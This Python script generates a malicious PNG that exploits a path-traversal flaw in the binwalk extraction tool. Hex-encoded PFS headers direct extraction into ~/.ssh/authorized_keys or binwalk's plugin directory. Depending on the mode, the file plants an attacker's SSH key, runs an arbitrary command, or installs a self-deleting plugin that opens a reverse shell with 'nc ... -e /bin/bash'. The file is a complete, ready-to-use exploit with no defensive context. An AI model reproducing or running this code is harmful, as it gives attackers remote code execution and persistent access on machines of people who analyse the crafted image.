import argparse
import sys


class ExploitGenerator:
    def __init__(self, args):
        self.args = args

    def generate_exploit(self):
        if self.args.option == "ssh":
            header = bytes.fromhex(
                "5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e7373682f617574686f72697a65645f6b657973000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
            with open(self.args.pub, "r") as pub_file:
                lines = pub_file.readlines()
        elif self.args.option in ["reverse", "command"]:
            if self.args.option == "reverse":
                command = f"nc {self.args.ip} {self.args.port} -e /bin/bash 2>/dev/null &"
            elif self.args.option == "command":
                if not self.args.command:
                    print("Please provide a command using --command option.")
                command = self.args.command
            header = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
            lines = [
                "import binwalk.core.plugin\n",
                "import os\n",
                "import shutil\n",
                "class MaliciousExtractor(binwalk.core.plugin.Plugin):\n",
                "    def init(self):\n",
                "        if not os.path.exists('/tmp/.binwalk'):\n",
                f'            os.system("{command}")\n',
                "            with open('/tmp/.binwalk', 'w') as temp_file:\n",
                "                temp_file.write('1')\n",
                "        else:\n",
                "            os.remove('/tmp/.binwalk')\n",
                "            os.remove(os.path.abspath(__file__))\n",
                "            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), '__pycache__'))\n"
            ]

        with open(self.args.file, "rb") as input_file:
            data = input_file.read()

        content = '\n'.join(lines).encode()

        with open("binwalk_exploit.png", "wb") as output_file:
            output_file.write(data)
            output_file.write(header)
            output_file.write(content)


def main():
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest="option")

    ssh_parser = subparsers.add_parser("ssh")
    ssh_parser.add_argument("file", help="Path to input .png file")
    ssh_parser.add_argument("pub", help="Path to pub key file")

    command_parser = subparsers.add_parser("command")
    command_parser.add_argument("--command", help="Command to execute")
    command_parser.add_argument("file", help="Path to input .png file")

    reverse_parser = subparsers.add_parser("reverse")
    reverse_parser.add_argument("file", help="Path to input .png file")
    reverse_parser.add_argument("ip", help="IP to nc listener")
    reverse_parser.add_argument("port", help="Port to nc listener")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
    else:
        generator = ExploitGenerator(args)
        generator.generate_exploit()


if __name__ == "__main__":
    main()
